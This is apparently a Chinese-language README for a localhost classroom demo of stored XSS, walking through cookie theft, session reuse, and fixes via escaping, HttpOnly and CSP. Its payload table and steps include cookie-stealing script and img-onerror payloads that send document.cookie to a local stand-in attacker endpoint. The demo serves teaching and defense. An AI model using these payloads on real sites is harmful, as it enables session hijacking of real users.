# XSS 演示环境

一个用来现场演示**存储型 XSS** 的最小系统。纯 Python 标准库，**零第三方依赖**，
所有服务只监听 `127.0.0.1`，不对外网开放。

> 仅用于教学与已授权测试。请勿把演示代码部署到任何对外可访问的环境。

---

## 一、组成

同时启动两个站点：

| 站点 | 地址 | 作用 |
|---|---|---|
| 受害者 | `http://127.0.0.1:8000` | 一个"内部办公系统"的部门留言板 |
| 攻击者 | `http://127.0.0.1:8001` | 接收被窃取的 Cookie，并演示凭证复用 |

留言板首次访问会自动以 `alice`（财务部）登录，模拟"你已经登录了公司内网"。

---

## 二、演示流程（约 2 分 20 秒）

### 1. 启动

```bash
cd demo
python xss_demo.py
```

浏览器开**两个窗口**，分别打开受害者站点和攻击者站点。

### 2. 先制造视觉冲击

在留言框粘贴，点"发表留言"：

```html
<script>alert('XSS by 演示')</script>
```

页面刷新后弹窗出现。**这里停顿一下**——弹窗内容不重要，重要的是这段代码是"我的"，
却跑在"你的网站"上。

### 3. 换成真正的攻击 payload

先点导航栏的"重置演示"清空，再粘贴：

```html
<script>new Image().src='http://127.0.0.1:8001/steal?c='+encodeURIComponent(document.cookie)</script>
```

页面看起来**毫无异常**——没有弹窗、没有跳转、没有报错。但切到运行 `xss_demo.py`
的终端，你会看到：

```
[攻击者] !! 收到被窃取的 Cookie !!
[攻击者]    凭证 = SESSID=xxxxxxxx
[攻击者]    来源 = 127.0.0.1   浏览器 = Mozilla/...
```

### 4. 凭证复用（重点）

回到攻击者控制台 `http://127.0.0.1:8001`，点击"用这个凭证登录受害者系统"。

页面会显示**登录成功**，并列出 alice 的邮箱、部门、角色。

讲清这一点：攻击者**从未知道 alice 的密码，也没有入侵任何一台服务器**，
只是把偷来的 Cookie 原样贴进了请求头。

---

## 三、演示防护：逐个开关

演示完攻击后，关掉服务（Ctrl+C），加上防护开关重启，再走一遍同样的攻击。

```bash
python xss_demo.py --escape      # 修复一：输出编码 —— 攻击链在浏览器这一环断掉
python xss_demo.py --httponly    # 修复二：Cookie 加 HttpOnly —— payload 执行了但偷不到东西
python xss_demo.py --csp         # 修复三：CSP —— 脚本被浏览器拒绝执行
python xss_demo.py --escape --httponly --csp   # 纵深防御
```

三个开关可以任意组合，现场逐个打开，观察攻击链在哪一环断掉。

| 开关 | 原理 | 现场观察到的现象 |
|---|---|---|
| `--escape` | 输出前把 `< > & " '` 转成 HTML 实体 | 留言里那串代码**变成纯文本**显示在页面上 |
| `--httponly` | Cookie 加 `HttpOnly`，JS 读不到 | payload 照样执行，但攻击者终端收不到有效凭证 |
| `--csp` | 下发 `Content-Security-Policy: default-src 'self'` | 浏览器控制台出现 CSP 违规告警，脚本不执行 |

---

## 四、不依赖浏览器的自检

万一现场浏览器出问题，可以跑自检脚本，它会用脚本把整条链路走一遍并打印结果：

```bash
python selftest.py            # 验证漏洞模式：攻击成功
python selftest.py --escape   # 验证输出编码：攻击在步骤 3 被阻断
```

输出会分 5 步展示：拿 Cookie → 发留言 → 服务端如何渲染 → 窃取请求 → 凭证复用。

---

## 五、备用 payload

| 用途 | payload |
|---|---|
| 弹窗 | `<script>alert('XSS by 演示')</script>` |
| 窃取 Cookie | `<script>new Image().src='http://127.0.0.1:8001/steal?c='+encodeURIComponent(document.cookie)</script>` |
| 无 script 标签（讲黑名单绕过用） | `<img src=x onerror="new Image().src='http://127.0.0.1:8001/steal?c='+encodeURIComponent(document.cookie)">` |
| 证明危害不止偷 Cookie | `<script>alert('当前页面标题: '+document.title)</script>` |

---

## 六、常见问题

**端口 8000/8001 被占用**

脚本会直接报错并提示。清理方式：

```bash
netstat -ano | findstr :8000
taskkill /F /PID <上面查到的PID>
```

（Windows 上 `SO_REUSEADDR` 允许两个进程绑同一端口，会导致新参数静默不生效。
本演示已显式关闭该行为，端口被占时一定会报错，不会出现"改了参数没效果"的情况。）

**页面刷新后留言还在**

演示数据存在内存里，只要服务没重启就一直在。点导航栏"重置演示"可以清空留言和会话。

**`document.cookie` 什么都没拿到**

检查是否用了 `--httponly` 模式——这正是该模式的预期效果。

---

## 七、代码结构提示

`xss_demo.py` 里有两处关键代码，讲稿会直接引用：

```python
# 漏洞点：留言被原样拼进 HTML（约 250 行 handle_board）
text = cm["text"]

# 修复点：输出前做 HTML 实体编码
if CFG["escape"]:
    text = html.escape(text)
```

以及 Cookie 的下发处：

```python
# 约 130 行 _cookie_header
if CFG["httponly"]:
    parts.append("HttpOnly")
```
